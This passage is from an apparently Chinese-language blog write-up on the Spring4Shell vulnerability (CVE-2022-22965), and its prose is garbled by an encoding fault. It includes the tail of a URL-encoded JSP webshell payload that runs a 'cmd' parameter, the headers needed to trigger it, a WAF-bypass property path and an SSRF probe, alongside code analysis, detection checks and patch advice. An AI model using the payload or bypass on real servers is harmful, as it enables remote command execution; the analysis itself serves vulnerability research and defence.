number">7</span>Bc1<span class="token operator">%</span><span class="token number">7D</span>i<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>int<span class="token operator">%</span><span class="token number">20</span>a<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">20</span>b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">%</span><span class="token number">20</span>new<span class="token operator">%</span><span class="token number">20</span>byte<span class="token operator">%</span><span class="token number">5</span>B2048<span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token function">20while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">%</span><span class="token number">3D</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">3D</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">20</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token function">20String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">7</span>Bsuffix<span class="token operator">%</span><span class="token number">7D</span>i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè®¿é—®webshellçš„æ—¶å€™ï¼Œé™¤äº†æä¾›cmdçš„å‚æ•°ä¹‹å¤–ï¼Œè¿˜éœ€è¦è®¾ç½®headerå¤´ï¼š</p><pre class="line-numbers language-none"><code class="language-none">headers &#x3D; &#123;&quot;suffix&quot;:&quot;%&gt;&#x2F;&#x2F;&quot;,            &quot;c1&quot;:&quot;Runtime&quot;,            &quot;c2&quot;:&quot;&lt;%&quot;,            &quot;DNT&quot;:&quot;1&quot;,            &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>Javaç‰ˆæœ¬&gt;=JDK9 </li><li>Spirngè¿è¡Œåœ¨Tomcatç¯å¢ƒä¸‹ï¼Œä»¥WaråŒ…éƒ¨ç½²(JaråŒ…çš„æ—¶å€™ä¸å­˜åœ¨)</li><li>æ–¹æ³•å…¥å‚æ˜¯éåŸºç¡€ç±»ï¼Œä¸èƒ½æ˜¯Stringï¼Œintç­‰</li><li>æ¥å£ä½¿ç”¨äº†POJOå‚æ•°ç»‘å®š</li></ul><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul><li>å¦‚æœè¦å¤šæ¬¡å†™æ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹fileDateFormatå±æ€§ï¼Œæœ€ç»ˆä¼šæ‹¼æ¥åˆ°æ–‡ä»¶åç¼€é‡Œé¢</li><li>åˆ©ç”¨æ—¥å¿—å†™å…¥shellçš„æ—¶å€™ï¼Œç”Ÿæˆçš„æ–‡ä»¶ä¼šä¸æ–­å†™å…¥ï¼Œå¯ä»¥å…³é—­æ—¥å¿—è®°å½•: <code>class.module.classLoader.resources.context.parent.pipeline.first.enabled=false</code></li></ul><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å½“Content-Typeæ˜¯<code>application/x-www-form-urlencoded</code>çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨<code>ServletModelAttributeMethodProcessor</code>è§£æè¯·æ±‚ï¼Œç„¶åè¿›å…¥å‚æ•°ç»‘å®š:<code>org.springframework.web.bind.ServletRequestDataBinder#bind(ServletRequest request)</code>:<br><img src="/2022/04/06/CVE-2022-22965/3.png"><br>æ­¤æ—¶çš„mpvä¿å­˜äº†è¯·æ±‚é‡Œé¢çš„key-valueå‚æ•°ï¼Œæ¥ç€è¿›å…¥<code>org.springframework.validation.DataBinder#doBind(MutablePropertyValues mpvs)</code>å¯¹è·å–åˆ°çš„<code>mpvs</code>è¿›è¡Œåˆæ­¥æ ¡éªŒï¼š<br><img src="/2022/04/06/CVE-2022-22965/4.png"></p><p>å°†mpvsç»‘å®šåˆ°beanå¯¹è±¡ä¸Š<code>setPropertyValues</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>AbstractPropertyAccessor</span>#<span class="token function">setPropertyValues</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>PropertyValues</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">,</span> <span class="token keyword">boolean</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/06/CVE-2022-22965/5.png"></p><p>ç„¶åè¿›å…¥åˆ°<code>setPropertyValue</code></p><pre class="line-numbers language-none"><code class="language-none">org.springframework.beans.AbstractNestablePropertyAccessor#setPropertyValue(org.springframework.beans.PropertyValue)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿›å…¥åˆ°: <code>getPropertyAccessorForPropertyPath</code>:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span></span>AbstractNestablePropertyAccessor</span>#<span class="token function">getPropertyAccessorForPropertyPath</span><span class="token punctuation">(</span><span class="token class-name">String</span> propertyPath<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªæ—¶å€™<code>propertyPath</code>æ˜¯httpè¯·æ±‚é‡Œé¢æ³¨å…¥çš„å˜é‡: <code>class.module.classLoader.resources.context.parent.appBase</code>ï¼Œæ­¤æ—¶å¯¹å˜é‡è¿›è¡Œåˆ†å‰²ï¼Œè·å–ç¬¬ä¸€ä¸ªclassçš„åç§»é‡ï¼Œåˆ°æœ€åéƒ½ä¼šè¿›å…¥åˆ°<code>org.springframework.beans.CachedIntrospectionResults#CachedIntrospectionResults</code>é‡Œé¢è¿›è¡ŒéªŒè¯ï¼Œè¿™é‡Œæ˜¯åˆ¤æ–­å½“è·å–åˆ°çš„å¯¹è±¡æ˜¯ä¸€ä¸ªClassè€Œåˆè·å–ClassLoaderå±æ€§ï¼Œåˆ™ç›´æ¥è·³è¿‡ã€‚<br><img src="/2022/04/06/CVE-2022-22965/8.png"></p><p>Strutså‡ºç°æ¼æ´çš„æ—¶å€™ï¼Œæœ‰å¸ˆå‚…å†™è¿‡<a href="https://cs.github.com/julianvilas/rooted2k15/blob/a00055f906502dd038b908a84907b74b38e26b20/struts-tester/struts-tester.jsp">jspè·å–å¯ç”¨çš„ç¯å¢ƒå˜é‡</a>çš„è„šæœ¬ï¼Œå¯ä»¥è·å–å¯ç”¨çš„ä¸Šä¸‹æ–‡ç¯å¢ƒå˜é‡ã€‚</p><p>ä»£ç å®¡è®¡phith0nå¸ˆå‚…å¯¹æ¼æ´çš„æ€»ç»“ï¼š</p><blockquote><p>åœ¨Javaé‡Œé¢ï¼Œæ‰€æœ‰çš„Javaå¯¹è±¡éƒ½æœ‰ä¸€ä¸ª<code>getClass()</code>æ–¹æ³•ï¼Œè·å–å¯¹è±¡çš„Classï¼ŒClassåˆæœ‰<code>getClassLoader()</code>æ–¹æ³•è·å–Classçš„<code>ClassLoader</code>ï¼Œè€Œåœ¨Tomcatä¸­ï¼Œä¸€äº›å’ŒTomcatçš„å…¨å±€é…ç½®ç›¸å…³çš„å±æ€§éƒ½ä¿å­˜åœ¨<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>è¿™ä¸ªTomcatä¸“å±çš„ClassLoaderçš„ä¸€äº›å±æ€§ã€å­å­™å±æ€§é‡Œã€‚<br>é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡person.getClass().getClassLoader().getXXX()æ¥è°ƒç”¨ParallelWebappClassLoaderä¸­çš„ä¸€äº›æ•æ„Ÿå±æ€§æœ€åé€šè¿‡ä¿®æ”¹Tomcatçš„é…ç½®æ¥æ‰§è¡Œå±é™©æ“ä½œã€‚è¿™ä¸ªè°ƒç”¨é“¾æ”¾åœ¨ç”¨æˆ·æ•°æ®åŒ…é‡Œå°±æ˜¯class.classLoader.XXX</p></blockquote><h2 id="æ¼æ´åˆ¤æ–­"><a href="#æ¼æ´åˆ¤æ–­" class="headerlink" title="æ¼æ´åˆ¤æ–­"></a>æ¼æ´åˆ¤æ–­</h2><h4 id="æ ¹æ®çŠ¶æ€ç "><a href="#æ ¹æ®çŠ¶æ€ç " class="headerlink" title="æ ¹æ®çŠ¶æ€ç "></a>æ ¹æ®çŠ¶æ€ç </h4><ul><li>è¿”å›500: <code>class.module.class.module.classLoader.xx</code></li><li>è¿”å›400: <code>class.module.classLoader.DefaultAssertionStatus=nonsense</code></li><li>è¿”å›302: <code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=true</code></li></ul><p>è¿”å›302çš„æ—¶å€™éœ€è¦åŒæ—¶æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶:</p><ol><li>è¯·æ±‚è·¯å¾„ä¸èƒ½ä»¥<code>/</code>ç»“å°¾</li><li>contextçš„<code>mapperDirectoryRedirectEnabled</code>å±æ€§ä¸ºtrue</li><li>è®¿é—®çš„åœ°å€æ˜¯å­˜åœ¨çš„ä¸€ä¸ªç›®å½•</li></ol><p>å½“<code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=false</code>çš„æ—¶å€™ï¼Œè®¿é—®ä¸€ä¸ªå­˜åœ¨çš„ç›®å½•æ˜¯404ï¼š<br><img src="/2022/04/06/CVE-2022-22965/1.png"><br>å½“<code>class.module.classLoader.resources.context.mapperDirectoryRedirectEnabled=true</code>ï¼š<br><img src="/2022/04/06/CVE-2022-22965/2.png"></p><h4 id="é€šè¿‡SSRF"><a href="#é€šè¿‡SSRF" class="headerlink" title="é€šè¿‡SSRF"></a>é€šè¿‡SSRF</h4><p>ä¸æ¨èä½¿ç”¨ï¼Œå¦‚æœåº”ç”¨ä½¿ç”¨äº†<code>configFile</code>ä¼šç ´åè¿è¡Œç¯å¢ƒï¼š</p><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.configFile&#x3D;https:&#x2F;&#x2F;&#123;&#123;interactsh-url&#125;&#125;&amp;class.module.classLoader.resources.context.configFile.content.aaa&#x3D;xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ç™½ç›’"><a href="#ç™½ç›’" class="headerlink" title="ç™½ç›’"></a>ç™½ç›’</h3><h4 id="ä½¿ç”¨-RequestBody"><a href="#ä½¿ç”¨-RequestBody" class="headerlink" title="ä½¿ç”¨@RequestBody"></a>ä½¿ç”¨@RequestBody</h4><p>å…ˆæ£€æŸ¥é¡¹ç›®ä¸­ä½¿ç”¨POJOçš„æ¥å£ï¼Œç„¶åå†æ£€æŸ¥æ˜¯å¦ä½¿ç”¨äº†<code>@RequestBody</code>æ³¨è§£ã€‚ä½¿ç”¨<code>@RequestBody</code>æ³¨è§£çš„æ¥å£æ˜¯æ¥æ”¶JSONå’ŒXMLç­‰è¯·æ±‚ï¼Œåº•å±‚ä½¿ç”¨<code>RequestResponseBodyMethodProcessor</code>å¤„ç†è¯·æ±‚ï¼Œè€ŒContent-Typeæ˜¯<code>application/x-www-form-urlencoded</code>çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨<code>ServletModelAttributeMethodProcessor</code>è§£æè¯·æ±‚ã€‚æ‰€ä»¥ä½¿ç”¨<code>@RequestBody</code>çš„æ—¶å€™ä¸å­˜åœ¨æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨egrepåˆæ­¥åŒ¹é…ä¹‹åï¼Œæ’æŸ¥æ²¡æœ‰ä½¿ç”¨<code>@RequestBody</code>çš„æ¥å£:</p><pre class="line-numbers language-none"><code class="language-none">egrep -5  -ri &quot;@(Get|Post|Put|Delete|Patch|Request)Mapping&quot; .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ä½¿ç”¨<code>@RequestBody</code>çš„æ—¶å€™ï¼Œå¦‚æœè‡ªå®šä¹‰äº†<a href="https://blog.csdn.net/justry_deng/article/details/99875548">å‚æ•°è§£æå™¨</a>ï¼Œä¹Ÿå°±æ˜¯è¯´åç«¯å¯ä»¥åŒæ—¶æ¥æ”¶<code>application/json</code>å’Œ<code>application/x-www-form-urlencoded</code>è¿™ä¸¤ç§è¯·æ±‚ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨æ¼æ´ã€‚åœ¨æµ‹è¯•JSONæ¥å£çš„æ—¶å€™å¯ä»¥æ”¹å˜Content-Typeä¸º<code>application/x-www-form-urlencoded</code>åšä¸€æ¬¡å°è¯•ã€‚</p><p>SpringMVCçš„<code>HandlerMethodArgumentResolver</code>æ˜¯æ–¹æ³•å‚æ•°è§£æå™¨æ¥å£ï¼Œè¿™ä¸ªæ¥å£æ˜¯SpringMVCå‚æ•°è§£æç»‘å®šçš„æ ¸å¿ƒæ¥å£ï¼Œå†…ç½®äº†å¾ˆå¤šç±»å®Œæˆ<a href="https://github.com/spring-projects/spring-framework/blob/d84ca2ba90d27a7c63d7b35a6259b5b9cf341118/spring-webmvc/src/main/java/org/springframework/web/servlet/mvc/method/annotation/RequestMappingHandlerAdapter.java#L644">å‚æ•°è§£æ</a>ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodArgumentResolver</span><span class="token punctuation">></span></span> <span class="token function">getDefaultArgumentResolvers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodArgumentResolver</span><span class="token punctuation">></span></span> resolvers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Annotation-based argument resolution</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestParamMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestParamMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PathVariableMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PathVariableMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MatrixVariableMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MatrixVariableMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletModelAttributeMethodProcessor</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestResponseBodyMethodProcessor</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestPartMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestHeaderMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestHeaderMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletCookieValueMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ExpressionValueMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SessionAttributeMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestAttributeMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Type-based argument resolution</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletRequestMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletResponseMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HttpEntityMethodProcessor</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RedirectAttributesMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ModelMethodProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MapMethodProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ErrorsMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SessionStatusMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UriComponentsBuilderMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">KotlinDetector</span><span class="token punctuation">.</span><span class="token function">isKotlinPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ContinuationHandlerMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¯”å¦‚:</p><ul><li><code>RequestParamMethodArgumentResolver</code>ï¼š   è´Ÿè´£è§£æ @RequestParam æ ‡è®°çš„å‚æ•°</li><li><code>ServletRequestMethodArgumentResolver</code>ï¼š è´Ÿè´£è§£æå…¥å‚ä¸º HttpServletRequestã€HttpMethod ç­‰ç±»å‹çš„å‚æ•°</li><li><code>ServletModelAttributeMethodProcessor</code>ï¼š è´Ÿè´£è§£æå…¥å‚ä¸º POJO ç±»çš„å‚æ•°</li><li><code>RequestResponseBodyMethodProcessor</code>ï¼š   è´Ÿè´£è§£æå…¥å‚ä¸º @RequestBody æ ‡æ³¨çš„å‚æ•°</li></ul><h4 id="ä½¿ç”¨consumesçš„æ—¶å€™"><a href="#ä½¿ç”¨consumesçš„æ—¶å€™" class="headerlink" title="ä½¿ç”¨consumesçš„æ—¶å€™"></a>ä½¿ç”¨consumesçš„æ—¶å€™</h4><p><code>@RequestMapping(value = &quot;/rapid7/v1&quot;, method = &#123;RequestMethod.GET, RequestMethod.POST&#125;, consumes = &quot;application/json&quot;)</code><br>ç»è¿‡æµ‹è¯•ï¼Œæœªè§¦å‘æ¼æ´</p><h4 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h4><p>æ¥è‡ª<a href="https://mp.weixin.qq.com/s/plFLE8e0-Fc2tHJ4HaiSSw">çƒ½ç«å°å®éªŒå®¤çš„ç»•è¿‡</a>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.resources.context.parent.pipeline.first.pattern<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å‡çº§Spring Frameworkåˆ°v5.3.18æˆ–v5.2.20</p><p>Springå‡çº§ä¹‹åTomcatä¹Ÿå‘å¸ƒäº†æ–°ç‰ˆæœ¬ï¼Œåœ¨<code>Tomcat 9.0.62</code>ç‰ˆæœ¬å¯¹<code>getResources()</code>æ–¹æ³•çš„è¿”å›å€¼åšäº†ä¿®æ”¹ï¼Œç›´æ¥è¿”å›nullã€‚<code>WebappClassLoaderBase</code>å³<code>ParallelWebappClassLoader</code>çš„çˆ¶ç±»ï¼Œåœ¨Webåº”ç”¨éƒ¨ç½²æ–¹å¼ä¸­ï¼Œåˆ©ç”¨<code>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</code>çš„é“¾è·¯å°±èµ°ä¸é€šäº†ã€‚<br><img src="/2022/04/06/CVE-2022-22965/9.png"></p><p>å…¶å®ƒä¸­é—´ä»¶çš„éƒ¨åˆ†ç¯å¢ƒå˜é‡å¯ä»¥å‚è€ƒ<a href="https://github.com/julianvilas/rooted2k15/blob/a00055f906/struts-tester/results/struts2-tomcat8-debug.txt">struts-tester</a></p><p><a href="https://www.anquanke.com/post/id/267124">RWCTF 4th Desperate Cat Writeup</a>çš„å®é™…æ¡ˆä¾‹çš„åˆ©ç”¨åŸç†ä¹Ÿå·®ä¸å¤šï¼Œä½†æ˜¯æ›´æœ‰è¶£ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://tttang.com/archive/1532/">ä»é›¶å¼€å§‹ï¼Œåˆ†æSpring Framework RCE</a></li><li><a href="https://mp.weixin.qq.com/s/plFLE8e0-Fc2tHJ4HaiSSw">å…³äºSpring framework rceï¼ˆCVE-2022-22965ï¼‰çš„ä¸€äº›é—®é¢˜æ€è€ƒ</a></li><li><a href="https://mp.weixin.qq.com/s/G1z7mydl4nc9SxcZjwUQwg">CVE-2022-22965 Springæ ¸å¿ƒæ¡†æ¶Spring4Shellè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†ä¸ä¿®å¤æ–¹å¼åˆ†æ</a></li><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/6020f5f7e74135970bc283317cc303fc6597b1e5/cves/2022/CVE-2022-22965.yaml">nuclei-templates</a></li><li><a href="https://xz.aliyun.com/t/11129">Spring Beans RCEåˆ†æ</a></li><li><a href="https://www.anquanke.com/post/id/267124">RWCTF 4th Desperate Cat Writeup</a></li><li><a href="https://mp.weixin.qq.com/s/bG3BCdM-suCZldN7FIpYqw">Spring å‚æ•°ç»‘å®šçš„åˆ†æä»¥åŠç”²æ–¹è‡ªæŸ¥</a></li><li><a href="https://d3fence.com/spring4shell-CVE-2022-22965-e2bdda3a816a4e5480a0bbcaabda2f8d">spring4shellï¼ˆCVE-2022-22965ï¼‰äº‹ä»¶è€ƒå¤èµ„æ–™æ¢³ç†</a></li><li><a href="https://juejin.cn/post/6894026079116197896">SpringMVC å…¥å‚è§£æåŸç†å’Œå®æˆ˜</a></li><li><a href="https://www.cnblogs.com/w-y-c-m/p/8443892.html">SpringMVCæºç ä¹‹å‚æ•°è§£æç»‘å®šåŸç†</a></li><li><a 